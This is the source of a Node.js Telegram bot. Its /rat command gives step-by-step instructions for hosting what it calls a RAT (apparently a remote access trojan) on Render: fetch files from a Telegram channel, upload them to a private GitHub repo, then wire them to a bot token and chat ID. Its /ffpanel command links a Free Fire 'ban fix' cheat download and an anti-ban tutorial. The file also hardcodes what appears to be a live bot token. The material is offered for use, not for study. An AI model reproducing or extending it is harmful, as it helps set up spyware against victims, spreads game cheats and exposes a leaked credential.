const { Telegraf } = require("telegraf");

// Replace with your actual bot token
const BOT_TOKEN = "7514837389:AAErwaEdT4JE_-IQKcYJ2EG3WQY1uHUg8Jc";

const bot = new Telegraf(BOT_TOKEN);

// /start command
bot.start((ctx) => {
  ctx.reply("👋 Hello! How can I assist you today?");
});

// /rat command
bot.command("rat", (ctx) => {
  ctx.reply(
    "🚀 *How to Deploy on Render*\n\n" +
      "📂 *Step 1:* [📥 Download Required Files](https://t.me/ghnxxheats/48)\n\n" +
      "🛠 *Step 2:* Create a *GitHub Account*\n\n" +
      "📦 *Step 3:* Create a *Private Repo* & Upload These Files:\n" +
      "   • 📄 `server.js`\n" +
      "   • 📄 `package.json`\n" +
      "   • 📄 `data.json`\n\n" +
      "🌐 *Step 4:* Go to [Render.com](https://render.com)\n" +
      "   • 🔹 Sign up with *GitHub*\n" +
      "   • 🔹 Confirm your account\n" +
      "   • 🔹 Connect your *GitHub account* to Render\n\n" +
      "⚡ *Step 5:* Create a *New Web Service*\n" +
      "   • 🔹 Click *New Web Service*\n" +
      "   • 🔹 Select *Free Trial*\n" +
      "   • 🔹 Choose any *random service name*\n" +
      "   • 🔹 Select your *GitHub repo* (it will start deploying automatically)\n\n" +
      "🔗 *Step 6:* Copy Your *Web Service URL*\n\n" +
      "🛠 *Step 7:* Edit `data.json` in Your GitHub Repo\n" +
      "   • 🔹 Enter your *Bot Token*, *Chat ID*, and *Web Service URL*\n" +
      "   • 🔹 Save the file\n\n" +
      "🚀 *Step 8:* Go Back to *Render*\n" +
      "   • 🔹 Open your project\n" +
      "   • 🔹 Click *Deploy Latest Commits*\n\n" +
      "⌛ *Step 9:* Wait a few seconds...\n" +
      "✅ Once the terminal shows *LIVE*, go to Telegram and start your bot!\n\n" +
      "📥 *[Download Required Files](https://t.me/ghnxxheats/48)*\n\n" +
      "💡 Need help? Feel free to ask! 🚀",
    { parse_mode: "Markdown" }
  );
});

// /ffpanel command (Correct Markdown formatting)
bot.command("ffpanel", (ctx) => {
  ctx.reply(
    "🔥 *Free Fire Panel* 🔥\n\n" +
      "✅ *BAN FIX FILE* – [Download Here](https://www.mediafire.com/file/wm476qzzbj64f1d/BAN+FIX+FILE_.zip/file)\n\n" +
      "📺 *Anti-Ban Tutorial* – [Watch Here](https://youtu.be/z8zsoB3nLEE?si=8ZOy1NhzY0QrsEab)",
    { parse_mode: "Markdown" }
  );
});

// Start the bot
bot.launch();
console.log("🤖 Bot is running...");
